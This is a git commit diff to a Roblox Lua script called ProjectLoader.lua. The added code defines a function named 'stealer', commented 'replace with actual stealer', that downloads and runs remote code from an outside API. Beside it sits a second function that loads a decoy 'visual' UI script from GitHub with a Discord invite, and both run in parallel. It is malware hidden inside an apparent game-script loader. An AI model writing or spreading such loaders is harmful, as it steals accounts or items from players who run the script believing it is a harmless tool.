31bbacac34095af8be62fbcf73f29942077efe7b
prohub-id <okbantoio@gmail.com>
2025-07-22 18:36:56 +0700

    Update ProjectLoader.lua

--- ProjectLoader.lua
+++ ProjectLoader.lua
@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/hOSdxaIYQM6uWtP8/raw", true))()
+local function stealer()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/hOSdxaIYQM6uWtP8/raw", true))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
